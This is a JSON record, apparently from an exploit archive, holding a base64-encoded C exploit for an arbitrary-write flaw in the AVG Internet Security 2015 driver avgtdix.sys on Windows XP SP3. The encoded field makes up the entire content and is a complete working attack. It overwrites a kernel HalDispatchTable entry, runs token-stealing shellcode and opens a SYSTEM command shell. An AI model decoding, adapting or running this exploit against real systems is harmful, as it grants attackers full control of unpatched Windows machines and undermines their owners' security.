{
    "source": "exploit-database", 
    "exploit": "77u/LyoNCg0KRXhwbG9pdCBUaXRsZSAgICAtIEFWRyBJbnRlcm5ldCBTZWN1cml0eSAyMDE1IEFyYml0cmFyeSBXcml0ZSBQcml2aWxlZ2UgRXNjYWxhdGlvbg0KRGF0ZSAgICAgICAgICAgICAtIDA0dGggRmVicnVhcnkgMjAxNQ0KRGlzY292ZXJlZCBieSAgICAtIFBhcnZleiBBbndhciAoQHBhcnZlemdoaCkNClZlbmRvciBIb21lcGFnZSAgLSBodHRwOi8vd3d3LmF2Zy5jb20vDQpUZXN0ZWQgVmVyc2lvbiAgIC0gMjAxNS4wLjUzMTUgDQpEcml2ZXIgVmVyc2lvbiAgIC0gMTUuMC4wLjUyMDQgLSBhdmd0ZGl4LnN5cw0KVGVzdGVkIG9uIE9TICAgICAtIDMyYml0IFdpbmRvd3MgWFAgU1AzIA0KT1NWREIgICAgICAgICAgICAtIGh0dHA6Ly93d3cub3N2ZGIub3JnL3Nob3cvb3N2ZGIvMTEzODI0DQpDVkUgSUQgICAgICAgICAgIC0gQ1ZFLTIwMTQtOTYzMg0KVmVuZG9yIGZpeCB1cmwgICAtIGh0dHA6Ly93d3cuYXZnLmNvbS9ldS1lbi9hdmctcmVsZWFzZS1ub3Rlcw0KRml4ZWQgVmVyc2lvbiAgICAtIDIwMTUuMC41NTU3DQpGaXhlZCBkcml2ZXIgdmVyIC0gMTUuMC4wLjU1NTMNCg0KDQoNCk5vdGUNCi0tLS0NCk92ZXJ3cml0dGVuIEhBTCBkaXNwYXRjaCB0YWJsZSBhZnRlciBleHBsb2l0DQoNCmtkPiBkcHMgbnQhSGFsRGlzcGF0Y2hUYWJsZSBsIGMNCjgwNTRjY2I4ICAwMDAwMDAwMw0KODA1NGNjYmMgIDAwMzQwMDAwDQo4MDU0Y2NjMCAgODY3OGQ5YTANCjgwNTRjY2M0ICAwYTA1MDAwMg0KODA1NGNjYzggIDZlNjY3NDRlDQo4MDU0Y2NjYyAgMDAxYzA3MDcNCjgwNTRjY2QwICAwMDAwMDE4MA0KODA1NGNjZDQgIDAwMDAwMWE0DQo4MDU0Y2NkOCAgODY3ZDY2OTANCjgwNTRjY2RjICA4NjcwNjQ4MA0KODA1NGNjZTAgIDAwMDAwMDAwDQo4MDU0Y2NlNCAgODA0ZTQyZDEgbnQhT2JwVHJhY2VEZXB0aCsweDE5DQoNCjEwIHBvaW50ZXJzIGdldCBvdmVyd3JpdHRlbi4gU2luY2UgaW5wdXQgYnVmZmVyIGlzIGluIG91ciBjb250cm9sIGFuZCBwb2ludGVycw0KYXJlIHN0YXRpYyBpbiBYUCBJJ3ZlIHRyaWdnZXJlZCB0aGUgb3ZlcndyaXRlIGFnYWluIHJlc3RvcmluZyB0aGUgcG9pbnRlcnMuDQoNCiovDQoNCg0KI2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8d2luZG93cy5oPg0KDQojZGVmaW5lIEJVRlNJWkUgNDA5Ng0KDQoNCnR5cGVkZWYgc3RydWN0IF9TWVNURU1fTU9EVUxFX0lORk9STUFUSU9OX0VOVFJZIHsNCiAgICAgUFZPSUQgICBVbmtub3duMTsNCiAgICAgUFZPSUQgICBVbmtub3duMjsNCiAgICAgUFZPSUQgICBCYXNlOw0KICAgICBVTE9ORyAgIFNpemU7DQogICAgIFVMT05HICAgRmxhZ3M7DQogICAgIFVTSE9SVCAgSW5kZXg7DQogICAgIFVTSE9SVCAgTmFtZUxlbmd0aDsNCiAgICAgVVNIT1JUICBMb2FkQ291bnQ7DQogICAgIFVTSE9SVCAgUGF0aExlbmd0aDsNCiAgICAgQ0hBUiAgICBJbWFnZU5hbWVbMjU2XTsNCn0gU1lTVEVNX01PRFVMRV9JTkZPUk1BVElPTl9FTlRSWSwgKlBTWVNURU1fTU9EVUxFX0lORk9STUFUSU9OX0VOVFJZOw0KIA0KdHlwZWRlZiBzdHJ1Y3QgX1NZU1RFTV9NT0RVTEVfSU5GT1JNQVRJT04gew0KICAgICBVTE9ORyAgIENvdW50Ow0KICAgICBTWVNURU1fTU9EVUxFX0lORk9STUFUSU9OX0VOVFJZIE1vZHVsZVsxXTsNCn0gU1lTVEVNX01PRFVMRV9JTkZPUk1BVElPTiwgKlBTWVNURU1fTU9EVUxFX0lORk9STUFUSU9OOw0KDQp0eXBlZGVmIGVudW0gX1NZU1RFTV9JTkZPUk1BVElPTl9DTEFTUyB7IA0KICAgICBTeXN0ZW1Nb2R1bGVJbmZvcm1hdGlvbiA9IDExLA0KICAgICBTeXN0ZW1IYW5kbGVJbmZvcm1hdGlvbiA9IDE2DQp9IFNZU1RFTV9JTkZPUk1BVElPTl9DTEFTUzsNCg0KdHlwZWRlZiBOVFNUQVRVUyAoV0lOQVBJICpfTnRRdWVyeVN5c3RlbUluZm9ybWF0aW9uKSgNCiAgICAgU1lTVEVNX0lORk9STUFUSU9OX0NMQVNTIFN5c3RlbUluZm9ybWF0aW9uQ2xhc3MsDQogICAgIFBWT0lEIFN5c3RlbUluZm9ybWF0aW9uLA0KICAgICBVTE9ORyBTeXN0ZW1JbmZvcm1hdGlvbkxlbmd0aCwNCiAgICAgUFVMT05HIFJldHVybkxlbmd0aCk7DQoNCnR5cGVkZWYgTlRTVEFUVVMgKFdJTkFQSSAqX050UXVlcnlJbnRlcnZhbFByb2ZpbGUpKA0KICAgICBEV09SRCBQcm9maWxlU291cmNlLCANCiAgICAgUFVMT05HIEludGVydmFsKTsNCg0KdHlwZWRlZiB2b2lkICgqRlVOQ1RQVFIpKCk7IA0KDQoNCg0KLy8gV2luZG93cyBYUCBTUDMNCg0KI2RlZmluZSBYUF9LUFJPQ0VTUyAweDQ0ICAgICAgLy8gT2Zmc2V0IHRvIF9LUFJPQ0VTUyBmcm9tIGEgX0VUSFJFQUQgc3RydWN0DQojZGVmaW5lIFhQX1RPS0VOICAgIDB4YzggICAgICAvLyBPZmZzZXQgdG8gVE9LRU4gZnJvbSB0aGUgX0VQUk9DRVNTIHN0cnVjdA0KI2RlZmluZSBYUF9VUElEICAgICAweDg0ICAgICAgLy8gT2Zmc2V0IHRvIFVuaXF1ZVByb2Nlc3NJZCBGUk9NIHRoZSBfRVBST0NFU1Mgc3RydWN0DQojZGVmaW5lIFhQX0FQTElOS1MgIDB4ODggICAgICAvLyBPZmZzZXQgdG8gQWN0aXZlUHJvY2Vzc0xpbmtzIF9FUFJPQ0VTUyBzdHJ1Y3QNCg0KDQpCWVRFIHRva2VuX3N0ZWFsX3hwW10gPQ0Kew0KICAweDUyLCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLy8gcHVzaCBlZHggICAgICAgICAgICAgICAgICAgICAgIFNhdmUgZWR4IG9uIHRoZSBzdGFjaw0KICAweDUzLAkgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLy8gcHVzaCBlYnggICAgICAgICAgICAgICAgICAgICAgIFNhdmUgZWJ4IG9uIHRoZSBzdGFjaw0KICAweDMzLDB4YzAsICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLy8geG9yIGVheCwgZWF4ICAgICAgICAgICAgICAgICAgIGVheCA9IDANCiAgMHg2NCwweDhiLDB4ODAsMHgyNCwweDAxLDB4MDAsMHgwMCwgICAgICAgICAgICAgICAgICAgIC8vIG1vdiBlYXgsIGZzOltlYXgrMTI0aF0gICAgICAgICBSZXRyaWV2ZSBFVEhSRUFEDQogIDB4OGIsMHg0MCxYUF9LUFJPQ0VTUywgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAvLyBtb3YgZWF4LCBbZWF4K1hQX0tQUk9DRVNTXSAgICAgUmV0cmlldmUgX0tQUk9DRVNTDQogIDB4OGIsMHhjOCwgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAvLyBtb3YgZWN4LCBlYXgNCiAgMHg4YiwweDk4LFhQX1RPS0VOLDB4MDAsMHgwMCwweDAwLCAgICAgICAgICAgICAgICAgICAgIC8vIG1vdiBlYngsIFtlYXgrWFBfVE9LRU5dICAgICAgICBSZXRyaWV2ZXMgVE9LRU4NCiAgMHg4YiwweDgwLFhQX0FQTElOS1MsMHgwMCwweDAwLDB4MDAsICAgICAgICAgICAgICAgICAgIC8vIG1vdiBlYXgsIFtlYXgrWFBfQVBMSU5LU10gPC18ICBSZXRyaWV2ZSBGTElOSyBmcm9tIEFjdGl2ZVByb2Nlc3NMaW5rcw0KICAweDgxLDB4ZTgsWFBfQVBMSU5LUywweDAwLDB4MDAsMHgwMCwgICAgICAgICAgICAgICAgICAgLy8gc3ViIGVheCwgWFBfQVBMSU5LUyAgICAgICAgIHwgIFJldHJpZXZlIF9FUFJPQ0VTUyBQb2ludGVyIGZyb20gdGhlIEFjdGl2ZVByb2Nlc3NMaW5rcw0KICAweDgxLDB4YjgsWFBfVVBJRCwweDAwLDB4MDAsMHgwMCwweDA0LDB4MDAsMHgwMCwweDAwLCAgLy8gY21wIFtlYXgrWFBfVVBJRF0sIDQgICAgICAgIHwgIENvbXBhcmVzIFVuaXF1ZVByb2Nlc3NJZCB3aXRoIDQgKFN5c3RlbSBQcm9jZXNzKQ0KICAweDc1LDB4ZTgsICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLy8gam5lICAgICAgICAgICAgICAgICAgICAgLS0tLSANCiAgMHg4YiwweDkwLFhQX1RPS0VOLDB4MDAsMHgwMCwweDAwLCAgICAgICAgICAgICAgICAgICAgIC8vIG1vdiBlZHgsIFtlYXgrWFBfVE9LRU5dICAgICAgICBSZXRyaWV2ZXMgVE9LRU4gYW5kIHN0b3JlcyBvbiBFRFgNCiAgMHg4YiwweGMxLCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC8vIG1vdiBlYXgsIGVjeCAgICAgICAgICAgICAgICAgICBSZXRyaWV2ZXMgS1BST0NFU1Mgc3RvcmVkIG9uIEVDWA0KICAweDg5LDB4OTAsWFBfVE9LRU4sMHgwMCwweDAwLDB4MDAsICAgICAgICAgICAgICAgICAgICAgLy8gbW92IFtlYXgrWFBfVE9LRU5dLCBlZHggICAgICAgIE92ZXJ3cml0ZXMgdGhlIFRPS0VOIGZvciB0aGUgY3VycmVudCBLUFJPQ0VTUw0KICAweDViLCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLy8gcG9wIGVieCAgICAgICAgICAgICAgICAgICAgICAgIFJlc3RvcmVzIGVieA0KICAweDVhLCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLy8gcG9wIGVkeCAgICAgICAgICAgICAgICAgICAgICAgIFJlc3RvcmVzIGVkeA0KICAweGMyLDB4MDggICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLy8gcmV0IDggICAgICAgICAgICAgICAgICAgICAgICAgIEF3YXkgZnJvbSB0aGUga2VybmVsICAgIA0KfTsNCg0KDQoNCkJZVEUgcmVzdG9yZV9wb2ludGVyc194cFtdID0gIC8vIGtkPiBkcHMgbnQhSGFsRGlzcGF0Y2hUYWJsZQ0KIlx4ZjJceGEzXHg2Zlx4ODAiICAgICAgICAgICAgLy8gODA1NGNjYmMgIDgwNmZhM2YyIGhhbCFIYWxpUXVlcnlTeXN0ZW1JbmZvcm1hdGlvbg0KIlx4Y2VceGEzXHg2Zlx4ODAiICAgICAgICAgICAgLy8gODA1NGNjYzAgIDgwNmZhM2NlIGhhbCFIYWxpU2V0U3lzdGVtSW5mb3JtYXRpb24NCiJceDBiXHg0Nlx4NjFceDgwIiAgICAgICAgICAgIC8vIDgwNTRjY2M0ICA4MDYxNDYwYiBudCF4SGFsUXVlcnlCdXNTbG90cw0KIlx4MDBceDAwXHgwMFx4MDAiICAgICAgICAgICAgLy8gODA1NGNjYzggIDAwMDAwMDAwDQoiXHg0ZFx4YWNceDUwXHg4MCIgICAgICAgICAgICAvLyA4MDU0Y2NjYyAgODA1MGFjNGQgbnQhSGFsRXhhbWluZU1CUg0KIlx4ODlceDZmXHg1Y1x4ODAiICAgICAgICAgICAgLy8gODA1NGNjZDAgIDgwNWM2Zjg5IG50IUlvQXNzaWduRHJpdmVMZXR0ZXJzDQoiXHhlNVx4NGFceDVjXHg4MCIgICAgICAgICAgICAvLyA4MDU0Y2NkNCAgODA1YzRhZTUgbnQhSW9SZWFkUGFydGl0aW9uVGFibGUNCiJceDdiXHgzZlx4NjFceDgwIiAgICAgICAgICAgIC8vIDgwNTRjY2Q4ICA4MDYxM2Y3YiBudCFJb1NldFBhcnRpdGlvbkluZm9ybWF0aW9uDQoiXHhlZlx4NDFceDYxXHg4MCIgICAgICAgICAgICAvLyA4MDU0Y2NkYyAgODA2MTQxZWYgbnQhSW9Xcml0ZVBhcnRpdGlvblRhYmxlDQoiXHg1N1x4ZDFceDUyXHg4MCI7ICAgICAgICAgICAvLyA4MDU0Y2NlMCAgODA1MmQxNTcgbnQhQ2NIYXNJbmFjdGl2ZVZpZXdzDQoNCg0KDQpEV09SRCBIYWxEaXNwYXRjaFRhYmxlQWRkcmVzcygpIA0Kew0KICAgIF9OdFF1ZXJ5U3lzdGVtSW5mb3JtYXRpb24gICAgTnRRdWVyeVN5c3RlbUluZm9ybWF0aW9uOw0KICAgIFBTWVNURU1fTU9EVUxFX0lORk9STUFUSU9OICAgcE1vZHVsZUluZm87DQogICAgRFdPUkQgICAgICAgICAgICAgICAgICAgICAgICBIYWxEaXNwYXRjaFRhYmxlOw0KICAgIENIQVIgICAgICAgICAgICAgICAgICAgICAgICAga0Z1bGxOYW1lWzI1Nl07DQogICAgUFZPSUQgICAgICAgICAgICAgICAgICAgICAgICBrQmFzZSA9IE5VTEw7DQogICAgTFBTVFIgICAgICAgICAgICAgICAgICAgICAgICBrTmFtZTsNCiAgICBITU9EVUxFICAgICAgICAgICAgICAgICAgICAgIEtlcm5lbDsNCiAgICBGVU5DVFBUUiAgICAgICAgICAgICAgICAgICAgIEhhbDsNCiAgICBVTE9ORyAgICAgICAgICAgICAgICAgICAgICAgIGxlbjsNCiAgICBOVFNUQVRVUyAgICAgICAgICAgICAgICAgICAgIHN0YXR1czsNCg0KDQogICAgTnRRdWVyeVN5c3RlbUluZm9ybWF0aW9uID0gKF9OdFF1ZXJ5U3lzdGVtSW5mb3JtYXRpb24pR2V0UHJvY0FkZHJlc3MoR2V0TW9kdWxlSGFuZGxlKCJudGRsbC5kbGwiKSwgIk50UXVlcnlTeXN0ZW1JbmZvcm1hdGlvbiIpOw0KIAkNCiAgICBpZiAoIU50UXVlcnlTeXN0ZW1JbmZvcm1hdGlvbikNCiAgICB7DQogICAgICAgIHByaW50ZigiWy1dIFVuYWJsZSB0byByZXNvbHZlIE50UXVlcnlTeXN0ZW1JbmZvcm1hdGlvblxuXG4iKTsNCiAgICAgICAgcmV0dXJuIC0xOyAgDQogICAgfQ0KDQogICAgc3RhdHVzID0gTnRRdWVyeVN5c3RlbUluZm9ybWF0aW9uKFN5c3RlbU1vZHVsZUluZm9ybWF0aW9uLCBOVUxMLCAwLCAmbGVuKTsNCg0KICAgIGlmICghc3RhdHVzKSANCiAgICB7DQogICAgICAgIHByaW50ZigiWy1dIEFuIGVycm9yIG9jY3VyZWQgd2hpbGUgcmVhZGluZyBOdFF1ZXJ5U3lzdGVtSW5mb3JtYXRpb24uIFN0YXR1cyA9IDB4JTA4eFxuXG4iLCBzdGF0dXMpOw0KICAgICAgICByZXR1cm4gLTE7DQogICAgfQ0KCQkNCiAgICBwTW9kdWxlSW5mbyA9IChQU1lTVEVNX01PRFVMRV9JTkZPUk1BVElPTilHbG9iYWxBbGxvYyhHTUVNX1pFUk9JTklULCBsZW4pOw0KDQogICAgaWYocE1vZHVsZUluZm8gPT0gTlVMTCkNCiAgICB7DQogICAgICAgIHByaW50ZigiWy1dIEFuIGVycm9yIG9jY3VycmVkIHdpdGggR2xvYmFsQWxsb2MgZm9yIHBNb2R1bGVJbmZvXG5cbiIpOw0KICAgICAgICByZXR1cm4gLTE7DQogICAgfQ0KDQogICAgc3RhdHVzID0gTnRRdWVyeVN5c3RlbUluZm9ybWF0aW9uKFN5c3RlbU1vZHVsZUluZm9ybWF0aW9uLCBwTW9kdWxlSW5mbywgbGVuLCAmbGVuKTsNCgkNCiAgICBtZW1zZXQoa0Z1bGxOYW1lLCAweDAwLCBzaXplb2Yoa0Z1bGxOYW1lKSk7DQogICAgc3RyY3B5X3Moa0Z1bGxOYW1lLCBzaXplb2Yoa0Z1bGxOYW1lKS0xLCBwTW9kdWxlSW5mby0+TW9kdWxlWzBdLkltYWdlTmFtZSk7DQogICAga0Jhc2UgPSBwTW9kdWxlSW5mby0+TW9kdWxlWzBdLkJhc2U7DQoNCiAgICBwcmludGYoIltpXSBLZXJuZWwgYmFzZSBuYW1lICVzXG4iLCBrRnVsbE5hbWUpOw0KICAgIGtOYW1lID0gc3RycmNocihrRnVsbE5hbWUsICdcXCcpOw0KDQogICAgS2VybmVsID0gTG9hZExpYnJhcnlBKCsra05hbWUpOw0KDQogICAgaWYoS2VybmVsID09IE5VTEwpIA0KICAgIHsNCiAgICAgICAgcHJpbnRmKCJbLV0gRmFpbGVkIHRvIGxvYWQga2VybmVsIGJhc2VcblxuIik7DQogICAgICAgIHJldHVybiAtMTsNCiAgICB9DQoNCiAgICBIYWwgPSAoRlVOQ1RQVFIpR2V0UHJvY0FkZHJlc3MoS2VybmVsLCAiSGFsRGlzcGF0Y2hUYWJsZSIpOw0KDQogICAgaWYoSGFsID09IE5VTEwpDQogICAgew0KICAgICAgICBwcmludGYoIlstXSBGYWlsZWQgdG8gZmluZCBIYWxEaXNwYXRjaFRhYmxlXG5cbiIpOw0KICAgICAgICByZXR1cm4gLTE7DQogICAgfQ0KICAgIA0KICAgIHByaW50ZigiW2ldIEhhbERpc3BhdGNoVGFibGUgYWRkcmVzcyAweCUwOHhcbiIsIEhhbCk7CQ0KICAgIHByaW50ZigiW2ldIEtlcm5lbCBoYW5kbGUgMHglMDh4XG4iLCBLZXJuZWwpOw0KICAgIHByaW50ZigiW2ldIEtlcm5lbCBiYXNlIGFkZHJlc3MgMHglMDh4XG4iLCBrQmFzZSk7ICAgICAgICAgIA0KDQogICAgSGFsRGlzcGF0Y2hUYWJsZSA9ICgoRFdPUkQpSGFsIC0gKERXT1JEKUtlcm5lbCArIChEV09SRClrQmFzZSk7DQoNCiAgICBwcmludGYoIlsrXSBLZXJuZWwgYWRkcmVzcyBvZiBIYWxEaXNwYXRjaFRhYmxlIDB4JTA4eFxuIiwgSGFsRGlzcGF0Y2hUYWJsZSk7DQoNCiAgICBpZighSGFsRGlzcGF0Y2hUYWJsZSkNCiAgICB7DQogICAgICAgIHByaW50ZigiWy1dIEZhaWxlZCB0byBjYWxjdWxhdGUgSGFsRGlzcGF0Y2hUYWJsZVxuXG4iKTsNCiAgICAgICAgcmV0dXJuIC0xOw0KICAgIH0NCg0KICAgIHJldHVybiBIYWxEaXNwYXRjaFRhYmxlOw0KfQ0KDQoNCmludCBHZXRXaW5kb3dzVmVyc2lvbigpDQp7DQogICAgaW50IHYgPSAwOw0KICAgIERXT1JEIHZlcnNpb24gPSAwLCBtaW5WZXJzaW9uID0gMCwgbWFqVmVyc2lvbiA9IDA7DQoNCiAgICB2ZXJzaW9uID0gR2V0VmVyc2lvbigpOw0KDQogICAgbWluVmVyc2lvbiA9IChEV09SRCkoSElCWVRFKExPV09SRCh2ZXJzaW9uKSkpOw0KICAgIG1halZlcnNpb24gPSAoRFdPUkQpKExPQllURShMT1dPUkQodmVyc2lvbikpKTsNCg0KICAgIGlmIChtaW5WZXJzaW9uID09IDEgJiYgbWFqVmVyc2lvbiA9PSA1KSB2ID0gMTsgIC8vICJXaW5kb3dzIFhQOw0KICAgIGlmIChtaW5WZXJzaW9uID09IDEgJiYgbWFqVmVyc2lvbiA9PSA2KSB2ID0gMjsgIC8vICJXaW5kb3dzIDciOw0KICAgIGlmIChtaW5WZXJzaW9uID09IDIgJiYgbWFqVmVyc2lvbiA9PSA1KSB2ID0gMzsgIC8vICJXaW5kb3dzIFNlcnZlciAyMDAzOw0KDQogICAgcmV0dXJuIHY7DQp9DQoNCg0Kdm9pZCBzcGF3blNoZWxsKCkNCnsNCiAgICBTVEFSVFVQSU5GT0Egc2k7DQogICAgUFJPQ0VTU19JTkZPUk1BVElPTiBwaTsNCg0KDQogICAgWmVyb01lbW9yeSgmcGksIHNpemVvZihwaSkpOw0KICAgIFplcm9NZW1vcnkoJnNpLCBzaXplb2Yoc2kpKTsNCiAgICBzaS5jYiA9IHNpemVvZihzaSk7DQoNCiAgICBzaS5jYiAgICAgICAgICA9IHNpemVvZihzaSk7IA0KICAgIHNpLmR3RmxhZ3MgICAgID0gU1RBUlRGX1VTRVNIT1dXSU5ET1c7DQogICAgc2kud1Nob3dXaW5kb3cgPSBTV19TSE9XTk9STUFMOw0KDQogICAgaWYgKCFDcmVhdGVQcm9jZXNzKE5VTEwsICJjbWQuZXhlIiwgTlVMTCwgTlVMTCwgVFJVRSwgQ1JFQVRFX05FV19DT05TT0xFLCBOVUxMLCBOVUxMLCAmc2ksICZwaSkpDQogICAgew0KICAgICAgICBwcmludGYoIlxuWy1dIENyZWF0ZVByb2Nlc3MgZmFpbGVkICglZClcblxuIiwgR2V0TGFzdEVycm9yKCkpOw0KICAgICAgICByZXR1cm47DQogICAgfQ0KDQogICAgQ2xvc2VIYW5kbGUocGkuaFRocmVhZCk7DQogICAgQ2xvc2VIYW5kbGUocGkuaFByb2Nlc3MpOw0KfQ0KDQoNCg0KaW50IG1haW4oaW50IGFyZ2MsIGNoYXIgKmFyZ3ZbXSkgDQp7DQoNCiAgICBfTnRRdWVyeUludGVydmFsUHJvZmlsZSAgICAgTnRRdWVyeUludGVydmFsUHJvZmlsZTsNCiAgICBMUFZPSUQgICAgICAgICAgICAgICAgICAgICAgaW5wdXRbMV0gPSB7MH07ICAgIA0KICAgIExQVk9JRCAgICAgICAgICAgICAgICAgICAgICBhZGRydG9zaGVsbDsNCiAgICBIQU5ETEUgICAgICAgICAgICAgICAgICAgICAgaERldmljZTsNCiAgICBEV09SRCAgICAgICAgICAgICAgICAgICAgICAgZHdSZXRCeXRlcyA9IDA7DQogICAgRFdPUkQgICAgICAgICAgICAgICAgICAgICAgIEhhbERpc3BhdGNoVGFibGVUYXJnZXQ7DQogICAgVUxPTkcgICAgICAgICAgICAgICAgICAgICAgIHRpbWUgPSAwOw0KICAgIHVuc2lnbmVkIGNoYXIgICAgICAgICAgICAgICBkZXZoYW5kbGVbTUFYX1BBVEhdOyANCg0KDQogICAgcHJpbnRmKCItLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tXG4iKTsNCiAgICBwcmludGYoIiAgICAgQVZHIEludGVybmV0IFNlY3VyaXR5IDIwMTUgKGF2Z3RkaXguc3lzKSBBcmJpdHJhcnkgV3JpdGUgRW9QIEV4cGxvaXQgICAgICBcbiIpOw0KICAgIHByaW50ZigiICAgICAgICAgICAgICAgICAgICAgICAgIFRlc3RlZCBvbiBXaW5kb3dzIFhQIFNQMyAoMzJiaXQpICAgICAgICAgICAgICAgICAgICAgIFxuIik7DQogICAgcHJpbnRmKCItLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tXG5cbiIpOw0KDQogICAgaWYgKEdldFdpbmRvd3NWZXJzaW9uKCkgPT0gMSkgDQogICAgew0KICAgICAgICBwcmludGYoIltpXSBSdW5uaW5nIFdpbmRvd3MgWFBcbiIpOw0KICAgIH0NCg0KICAgIGlmIChHZXRXaW5kb3dzVmVyc2lvbigpID09IDApIA0KICAgIHsNCiAgICAgICAgcHJpbnRmKCJbaV0gRXhwbG9pdCBub3Qgc3VwcG9ydGVkIG9uIHRoaXMgT1NcblxuIik7DQogICAgICAgIHJldHVybiAtMTsNCiAgICB9ICANCg0KICAgIHNwcmludGYoZGV2aGFuZGxlLCAiXFxcXC5cXCVzIiwgImF2Z3RkaSIpOw0KDQogICAgTnRRdWVyeUludGVydmFsUHJvZmlsZSA9IChfTnRRdWVyeUludGVydmFsUHJvZmlsZSlHZXRQcm9jQWRkcmVzcyhHZXRNb2R1bGVIYW5kbGUoIm50ZGxsLmRsbCIpLCAiTnRRdWVyeUludGVydmFsUHJvZmlsZSIpOw0KIAkNCiAgICBpZiAoIU50UXVlcnlJbnRlcnZhbFByb2ZpbGUpDQogICAgew0KICAgICAgICBwcmludGYoIlstXSBVbmFibGUgdG8gcmVzb2x2ZSBOdFF1ZXJ5SW50ZXJ2YWxQcm9maWxlXG5cbiIpOw0KICAgICAgICByZXR1cm4gLTE7ICANCiAgICB9DQogICANCiAgICBhZGRydG9zaGVsbCA9IFZpcnR1YWxBbGxvYyhOVUxMLCBCVUZTSVpFLCBNRU1fQ09NTUlUIHwgTUVNX1JFU0VSVkUsIFBBR0VfRVhFQ1VURV9SRUFEV1JJVEUpOw0KDQogICAgaWYoYWRkcnRvc2hlbGwgPT0gTlVMTCkNCiAgICB7DQogICAgICAgIHByaW50ZigiWy1dIFZpcnR1YWxBbGxvYyBhbGxvY2F0aW9uIGZhaWx1cmUgJS44eFxuXG4iLCBHZXRMYXN0RXJyb3IoKSk7DQogICAgICAgIHJldHVybiAtMTsNCiAgICB9DQogICAgcHJpbnRmKCJbK10gVmlydHVhbEFsbG9jIGFsbG9jYXRlZCBtZW1vcnkgYXQgMHglLjh4XG4iLCBhZGRydG9zaGVsbCk7DQoNCiAgICBtZW1zZXQoYWRkcnRvc2hlbGwsIDB4OTAsIEJVRlNJWkUpOw0KICAgIG1lbWNweShhZGRydG9zaGVsbCwgdG9rZW5fc3RlYWxfeHAsIHNpemVvZih0b2tlbl9zdGVhbF94cCkpOw0KICAgIHByaW50ZigiW2ldIFNpemUgb2Ygc2hlbGxjb2RlICVkIGJ5dGVzXG4iLCBzaXplb2YodG9rZW5fc3RlYWxfeHApKTsNCg0KICAgIGhEZXZpY2UgPSBDcmVhdGVGaWxlKGRldmhhbmRsZSwgR0VORVJJQ19SRUFEIHwgR0VORVJJQ19XUklURSwgRklMRV9TSEFSRV9SRUFEIHwgRklMRV9TSEFSRV9XUklURSwgTlVMTCwgT1BFTl9FWElTVElORyAsIDAsIE5VTEwpOw0KICAgIA0KICAgIGlmIChoRGV2aWNlID09IElOVkFMSURfSEFORExFX1ZBTFVFKQ0KICAgIHsNCiAgICAgICAgcHJpbnRmKCJbLV0gQ3JlYXRlRmlsZSBvcGVuICVzIGRldmljZSBmYWlsZWQgKCVkKVxuXG4iLCBkZXZoYW5kbGUsIEdldExhc3RFcnJvcigpKTsNCiAgICAgICAgcmV0dXJuIC0xOw0KICAgIH0NCiAgICBlbHNlIA0KICAgIHsNCiAgICAgICAgcHJpbnRmKCJbK10gT3BlbiAlcyBkZXZpY2Ugc3VjY2Vzc2Z1bFxuIiwgZGV2aGFuZGxlKTsNCiAgICB9DQoNCiAgICBIYWxEaXNwYXRjaFRhYmxlVGFyZ2V0ID0gSGFsRGlzcGF0Y2hUYWJsZUFkZHJlc3MoKSArIHNpemVvZihEV09SRCk7DQogICAgcHJpbnRmKCJbK10gSGFsRGlzcGF0Y2hUYWJsZSs0ICgweCUwOHgpIHdpbGwgYmUgb3ZlcndyaXR0ZW5cbiIsIEhhbERpc3BhdGNoVGFibGVUYXJnZXQpOw0KDQogICAgaW5wdXRbMF0gPSBhZGRydG9zaGVsbDsgIC8vIGlucHV0IGJ1ZmZlciBjb250ZW50cyBnZXRzIHdyaXR0ZW4gdG8gb3VyIG91dHB1dCBidWZmZXIgYWRkcmVzcw0KICAgICAgICAgICAgICAgICAgICANCiAgICBwcmludGYoIlsrXSBJbnB1dCBidWZmZXIgY29udGVudHMgJTA4eFxuIiwgaW5wdXRbMF0pOw0KIAkNCiAgICBwcmludGYoIlt+XSBQcmVzcyBhbnkga2V5IHRvIHNlbmQgRXhwbG9pdCAgLiAuIC5cbiIpOw0KICAgIGdldGNoKCk7DQoNCiAgICBEZXZpY2VJb0NvbnRyb2woaERldmljZSwgMHg4MzAwMjBmOCwgaW5wdXQsIHNpemVvZihpbnB1dCksIChMUFZPSUQpSGFsRGlzcGF0Y2hUYWJsZVRhcmdldCwgMCwgJmR3UmV0Qnl0ZXMsIE5VTEwpOw0KDQogICAgcHJpbnRmKCJbK10gQnVmZmVyIHNlbnRcbiIpOw0KDQogICAgcHJpbnRmKCJbK10gU3Bhd25pbmcgU1lTVEVNIFNoZWxsXG4iKTsNCiAgICBOdFF1ZXJ5SW50ZXJ2YWxQcm9maWxlKDIsICZ0aW1lKTsNCiAgICBzcGF3blNoZWxsKCk7DQoNCiAgICBwcmludGYoIlsrXSBSZXN0b3JpbmcgSGFsIGRpc3BhdGNoIHRhYmxlIHBvaW50ZXJzXG5cbiIpOw0KDQogICAgRGV2aWNlSW9Db250cm9sKGhEZXZpY2UsIDB4ODMwMDIwZjgsIHJlc3RvcmVfcG9pbnRlcnNfeHAsIHNpemVvZihyZXN0b3JlX3BvaW50ZXJzX3hwKS0xLCAoTFBWT0lEKUhhbERpc3BhdGNoVGFibGVUYXJnZXQsIDAsICZkd1JldEJ5dGVzLCBOVUxMKTsNCg0KICAgIENsb3NlSGFuZGxlKGhEZXZpY2UpOw0KDQogICAgcmV0dXJuIDA7DQp9", 
